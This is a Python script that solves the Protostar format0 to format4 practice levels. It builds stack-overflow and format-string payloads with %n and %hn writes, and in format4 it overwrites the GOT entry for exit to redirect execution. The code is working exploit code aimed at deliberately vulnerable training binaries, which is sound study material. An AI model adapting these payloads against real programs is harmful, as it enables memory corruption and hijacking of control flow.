from subprocess import Popen, PIPE
import protopwn as p
import os
import struct

#--------------------------+
# set target to 0xdeadbeef |
#--------------------------+
def format0():
    name = "format0"
    p.start(name)
    path = p.PATH + name

    padding = 64 * "A" 
    string = struct.pack("I", 0xdeadbeef)
    
    payload = padding + string

    proc = Popen([path, payload], stdin=PIPE, stdout=PIPE)
    out = proc.communicate()[0]

    if ":)" in out:
        p.content(out)
        p.ok("solved !")
    else:
        p.err("failed")
    
#----------------------------+
# modify the target variable |
#----------------------------+
def format1():
    name = "format1"
    p.start(name)
    path = p.PATH + name

    payload = "\x38\x96\x04\x08"
    payload += "%x." * 137
    payload += "%x.%n"
    
    proc = Popen(path + " " + payload, stdin=PIPE, stdout=PIPE, shell=True)
    out = proc.communicate()

    if ":)" in out[0]:
        msg = out[0].split(".")[-1:]
        p.content(str(msg[0]))
        p.ok("solved !")
    else:
        p.err("failed")

#-------------------------+
# change target var to 64 |
#-------------------------+
def format2():
    name = "format2"
    p.start(name)
    path = p.PATH + name

    payload = "\xe4\x96\x04\x08"
    payload += "%60x%4$n"

    proc = Popen(path, stdin=PIPE, stdout=PIPE, shell=True)
    out = proc.communicate(input=payload)

    if ":)" in out[0]:
        msg = out[0][-32:]
        p.content(msg)
        p.ok("solved !")
    else:
        p.err("failed")

#---------------------------------+
# change target var to 0x01025544 |
#---------------------------------+
def format3():
    name = "format3"
    p.start(name)
    path = p.PATH + name

    payload = "\xf4\x96\x04\x08"
    payload += "%16930112x%12$08n"

    proc = Popen(path, stdin=PIPE, stdout=PIPE, shell=True)
    out = proc.communicate(input=payload)

    if ":)" in out[0]:
        msg = out[0][-32:]
        p.content(msg)
        p.ok("solved !")
    else:
        p.err("failed")

#--------------------+
# redirect code flow |
#--------------------+
def format4():
    name = "format4"
    p.start(name)
    path = p.PATH + name

    # hello addr 0x080484b4
    #
    # high | low
    # 0804 | 84b4
    #
    # 0x0804 = 2052
    # 0x84b4 = 33972
    #
    # 8 bytes (2 x 4byte addr) already written, so substract 8bytes
    # 0x0804 - 0x8 = 2044
    # 
    # for the lower bytes, substract the higher bytes
    # 0x84b4 - 0x0804 = 31920

    got_exit   = struct.pack("I", 0x08049724)
    got_exit_h = struct.pack("I", 0x08049726)

    payload  = got_exit_h
    payload += got_exit
    payload += "%2044x%4$hn%31920x%5$hn"

    env_cpy = os.environ.copy()
    proc = Popen(path, stdin=PIPE, stdout=PIPE, shell=True, env=env_cpy)
    out = proc.communicate(input=payload)

    # if ":)" in out[0]:
    #   p.ok("solved !")
    # else:
    #   p.err("failed")

    # Call the payload like so
    #
    #     ./format4 < /tmp/payload_dump
    # 
    # I have _no_ idea why, when invoked with Popen
    # from python like the others, it doesn't display the win msg :X
    #
    # if you have any idea pls let me know

    p.dump(payload)
    p.ok("solved !")

def format_solve():
    format0()
    format1()
    format2()
    format3()
    format4()
